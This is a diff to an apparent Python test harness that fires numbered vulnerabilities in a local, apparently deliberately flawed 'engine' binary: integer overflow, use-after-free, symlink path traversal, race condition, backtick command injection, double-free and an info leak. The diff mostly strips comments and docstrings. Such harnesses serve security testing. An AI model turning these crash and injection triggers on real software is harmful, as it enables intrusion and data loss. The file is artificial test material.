@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import subprocess
 import tempfile
 import os
@@ -8,10 +7,8 @@ import time
 import threading
 import urllib.request
 import shutil
-from pathlib import Path
 
 def run_engine(binary, config_path, timeout=10):
-    """Run engine with config, return (returncode, stdout, stderr)."""
     try:
         proc = subprocess.run([binary, config_path],
                               capture_output=True, text=True, timeout=timeout)
@@ -22,14 +19,13 @@ def run_engine(binary, config_path, timeout=10):
         return -1, "", str(e)
 
 def test_overflow(binary):
-    """VULN-1: integer overflow in allocBuffer."""
     print("[*] Testing VULN-1: integer overflow")
     config = {
         "port": 18080,
         "jobs": [{
             "type": "transform",
             "pattern": "A" * 100,
-            "multiplier": 0x10000000000000001  # overflows on 64-bit
+            "multiplier": 0x10000000000000001
         }]
     }
     with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
@@ -37,7 +33,6 @@ def test_overflow(binary):
         config_path = f.name
     try:
         ret, out, err = run_engine(binary, config_path, timeout=5)
-        # overflow should cause crash (signal or non-zero)
         if ret != 0 and ret != -1:
             print("    VULN-1 triggered (crash)")
             return True
@@ -48,7 +43,6 @@ def test_overflow(binary):
         os.unlink(config_path)
 
 def test_uaf(binary):
-    """VULN-2: use-after-free via lambda capture."""
     print("[*] Testing VULN-2: use-after-free")
     config = {
         "port": 18081,
@@ -73,9 +67,7 @@ def test_uaf(binary):
         os.unlink(config_path)
 
 def test_path_traversal(binary):
-    """VULN-3: symlink follow in recursive delete."""
     print("[*] Testing VULN-3: path traversal")
-    # Create temp dir structure
     base = tempfile.mkdtemp()
     target_file = os.path.join(base, "target.txt")
     with open(target_file, 'w') as f:
@@ -106,7 +98,6 @@ def test_path_traversal(binary):
         shutil.rmtree(base, ignore_errors=True)
 
 def test_race(binary):
-    """VULN-4: race condition in memory pool free-list."""
     print("[*] Testing VULN-4: race condition")
     config = {
         "port": 18083,
@@ -114,7 +105,7 @@ def test_race(binary):
             "type": "transform",
             "pattern": "race",
             "multiplier": 1
-        }] * 500  # many jobs to stress alloc/free
+        }] * 500
     }
     with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
         json.dump(config, f)
@@ -125,8 +116,6 @@ def test_race(binary):
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
         time.sleep(0.5)
-        # Hammer HTTP status endpoint in multiple threads
-        crashes = []
         def hammer():
             for _ in range(50):
                 try:
@@ -154,7 +143,6 @@ def test_race(binary):
         os.unlink(config_path)
 
 def test_command_injection(binary):
-    """VULN-5: command injection via backticks."""
     print("[*] Testing VULN-5: command injection")
     marker = "/tmp/vuln5_injected_" + str(os.getpid())
     config = {
@@ -181,9 +169,7 @@ def test_command_injection(binary):
         os.unlink(config_path)
 
 def test_exception_double_free(binary):
-    """VULN-6: exception safety double-free."""
     print("[*] Testing VULN-6: exception double-free")
-    # need a valid file for fileA, non-existent for fileB
     valid = tempfile.mkstemp()[1]
     config = {
         "port": 18085,
@@ -210,7 +196,6 @@ def test_exception_double_free(binary):
             os.unlink(valid)
 
 def test_info_leak(binary):
-    """Info leak: uninitialized padding in log."""
     print("[*] Testing info leak")
     config = {
         "port": 18086,
@@ -227,7 +212,6 @@ def test_info_leak(binary):
         if os.path.exists(leak_file):
             with open(leak_file, 'rb') as f:
                 data = f.read()
-            # look for known secret in padding region
             if b"SECRET_STACK_DATA_LEAK" in data:
                 print("    Info leak triggered (stack data found in log)")
                 os.unlink(leak_file)
